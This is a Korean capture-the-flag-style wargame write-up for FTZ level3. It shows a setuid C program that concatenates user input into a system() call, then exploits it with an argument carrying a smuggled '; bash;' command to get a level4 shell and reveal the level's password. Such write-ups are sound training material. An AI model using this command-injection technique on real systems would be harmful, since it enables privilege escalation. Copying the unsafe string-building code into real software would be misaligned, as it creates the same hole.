# Level3

`[level3@ftz level3]$ cat hint`

다음 코드는 **autodig**의 소스이다.
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv){

char cmd[100];

if( argc!=2 ){
    printf( "Auto Digger Version 0.9\n" );
    printf( "Usage : %s host\n", argv[0] );
    exit(0);
}

strcpy( cmd, "dig @" );
strcat( cmd, argv[1] );
strcat( cmd, " version.bind chaos txt");

system( cmd );
}
```

이를 이용하여 level4의 권한을 얻어라.

more hints.

1) 동시에 여러 명령어를 사용하려면?

2) 문자열 형태로 명령어를 전달하려면?

***

`[level3@ftz level3]$ find / -name autodig 2>/dev/null`

/bin/autodig

`[level3@ftz level3]$ find / -user level4 -perm -4000 2>/dev/null`

/bin/autodig

`[level3@ftz level3]$ ls -l /bin/autodig`

-rwsr-x---    1 level4   level3      12194 Aug 19  2014 /bin/autodig

`[level3@ftz level3]$ /bin/autodig "8.8.8.8 www.naver.com; bash;"`

; <<>> DiG 9.2.1 <<>> @8.8.8.8 www.naver.com   
;; global options:  printcmd   
;; Got answer:   
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32087   
;; flags: qr rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 0

;; QUESTION SECTION:   
;www.naver.com.                 IN      A

;; ANSWER SECTION:   
www.naver.com.          17776   IN      CNAME   www.naver.com.nheos.com.   
www.naver.com.nheos.com. 7855   IN      CNAME   www.naver.com.edgekey.net.   
www.naver.com.edgekey.net. 17356 IN     CNAME   e6030.a.akamaiedge.net.   
e6030.a.akamaiedge.net. 19      IN      A       23.35.221.113

;; Query time: 35 msec   
;; SERVER: 8.8.8.8#53(8.8.8.8)   
;; WHEN: Fri Jun  4 13:03:43 2021   
;; MSG SIZE  rcvd: 153   

***

`[level4@ftz level3]$ my-pass`

Level4 Password is "suck my brain".

